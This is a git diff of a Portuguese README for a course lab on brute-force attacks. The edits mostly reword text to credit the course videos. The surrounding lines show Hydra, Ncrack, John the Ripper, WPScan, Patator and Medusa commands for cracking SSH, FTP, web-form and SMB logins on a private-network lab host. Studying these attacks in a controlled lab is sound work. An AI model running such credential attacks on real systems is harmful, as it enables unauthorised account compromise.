@@ -29,7 +29,7 @@
 
 Ataques de força bruta continuam sendo uma das formas mais comuns de comprometimento de credenciais em ambientes corporativos, especialmente quando senhas fracas e serviços mal configurados coexistem.
 
-Este projeto documenta o estudo e a simulação prática desses ataques em ambiente controlado, desde a enumeração de usuários até a validação do acesso obtido, passando pelo uso de múltiplas ferramentas do ecossistema Kali Linux.
+Este repositório documenta os conceitos, comandos e cenários estudados e simulados ao longo do curso, com base nas aulas e materiais oficiais da DIO. Os exemplos de configuração, comandos e fluxos de ataque foram reproduzidos e documentados a partir do conteúdo apresentado nas videoaulas, com o objetivo de consolidar o aprendizado e servir como material de referência.
 
 ### 🎯 Objetivos
 
@@ -80,7 +80,7 @@ nmap -sV 192.168.56.102
 
 ## 🛠️ Arsenal de Ferramentas
 
-O curso cobriu diversas ferramentas do ecossistema Kali Linux para força bruta. Cada uma tem seu ponto forte:
+O curso apresentou diversas ferramentas do ecossistema Kali Linux para força bruta, cada uma com seu ponto forte e caso de uso ideal. Abaixo estão os conceitos estudados e os comandos demonstrados nas aulas:
 
 | Ferramenta | Especialidade | Melhor Para |
 |-----------|--------------|------------|
@@ -91,7 +91,7 @@ O curso cobriu diversas ferramentas do ecossistema Kali Linux para força bruta.
 | **WPScan** | Força bruta específica para WordPress | Enumeração de usuários e senhas em WP |
 | **Patator** | Altamente customizável | Cenários complexos com lógica condicional |
 
-### Hydra: Exemplo de Uso
+### Hydra:  Exemplo de Uso
 
 ```bash
 # Força bruta em SSH
@@ -102,14 +102,14 @@ hydra -l admin -P senhas.txt 192.168.56.102 http-post-form \
   "/login:username=^USER^&password=^PASS^:Login failed"
 ```
 
-### Ncrack: Exemplo de Uso
+### Ncrack:  Exemplo de Uso
 
 ```bash
 # Ataque a SSH com lista de usuários e senhas
 ncrack -U usuarios.txt -P senhas.txt ssh://192.168.56.102
 ```
 
-### John the Ripper: Exemplo de Uso
+### John the Ripper:  Exemplo de Uso
 
 ```bash
 # Quebra de hash MD5
@@ -119,7 +119,7 @@ john --format=md5 hashes.txt --wordlist=senhas.txt
 john --show hashes.txt
 ```
 
-### WPScan: Exemplo de Uso
+### WPScan:  Exemplo de Uso
 
 ```bash
 # Enumeração de usuários WordPress
@@ -130,7 +130,7 @@ wpscan --url http://192.168.56.102/wordpress \
   -U usuarios.txt -P senhas.txt
 ```
 
-### Patator: Exemplo de Uso
+### Patator:  Exemplo de Uso
 
 ```bash
 # Força bruta em FTP com condição de falha
@@ -175,7 +175,9 @@ Lista de vazamentos → testa combinações reais em novo alvo
 
 ## 💥 Cenários Práticos
 
-### Cenário 1: Força Bruta em FTP com Medusa
+> Os cenários abaixo foram estudados e documentados com base nas aulas do curso. Os comandos, fluxos e resultados esperados reproduzem o que foi demonstrado nas videoaulas.
+
+### Cenário 1:  Força Bruta em FTP com Medusa
 
 **Objetivo:** Comprometer credenciais do serviço FTP ativo no Metasploitable 2.
 
@@ -191,7 +193,7 @@ medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M ftp -t 4
 | `-M` | Módulo (protocolo) |
 | `-t` | Threads paralelas |
 
-**Resultado esperado:**
+**Resultado demonstrado nas aulas:**
 ```
 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin
 ```
@@ -204,7 +206,7 @@ ftp 192.168.56.102
 
 ---
 
-### Cenário 2: Força Bruta em Formulário Web (DVWA)
+### Cenário 2:  Força Bruta em Formulário Web (DVWA)
 
 **Objetivo:** Automatizar tentativas de login no DVWA com segurança no nível Low.
 
@@ -219,7 +221,7 @@ medusa -h 192.168.56.102 -u admin -P senhas.txt -M web-form \
 
 ---
 
-### Cenário 3: Enumeração SMB e Password Spraying
+### Cenário 3:  Enumeração SMB e Password Spraying
 
 **Objetivo:** Enumerar usuários do serviço SMB e executar spraying para evitar account lockout.
 
@@ -240,7 +242,7 @@ smb: \> ls
 
 ---
 
-### Cenário 4: Cenário Corporativo Mal Configurado
+### Cenário 4:  Cenário Corporativo Mal Configurado
 
 Simulação de uma empresa com múltiplos serviços ativos, credenciais padrão e sem MFA. O fluxo completo do ataque:
 
@@ -281,7 +283,7 @@ Senha@2024
 empresa123
 ```
 
-> Em pentest autorizados reais, ferramentas como **rockyou.txt**, **SecLists** ou wordlists customizadas com base em OSINT da organização-alvo são muito mais eficazes.
+> As wordlists abaixo foram criadas com base nos exemplos apresentados nas aulas. Em pentest autorizados reais, ferramentas como **rockyou.txt**, **SecLists** ou wordlists customizadas com base em OSINT da organização-alvo são muito mais eficazes.
 
 ---
 
